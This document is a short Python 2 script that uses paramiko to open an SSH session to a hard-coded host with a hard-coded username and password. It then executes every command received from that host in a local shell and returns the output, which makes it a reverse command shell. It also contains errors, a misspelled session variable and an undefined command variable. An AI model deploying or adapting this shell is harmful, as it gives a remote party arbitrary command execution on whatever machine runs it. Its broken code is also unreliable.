import threading,paramiko,subprocess

def ssh_command(ip,user,pwd,cmd):
	client=paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip,username=user,password=pwd)
	ssh_session=client.get_transport().open_session()
	if ssh_session.active:
		ssh.session.send(cmd)
		print ssh.session.recv(4096)
		while True:
			cmd=ssh_session.recv(1024)
			try:
				cmd_op=subprocess.check_output(command,shell=True)
				ssh_session.send(cmd_op)
			except Exception,e:
				ssh_session.send(str(e))
		client.close()
	return 
ssh_command('192.168.100.130', 'arul', 'toor','ClientConnected')
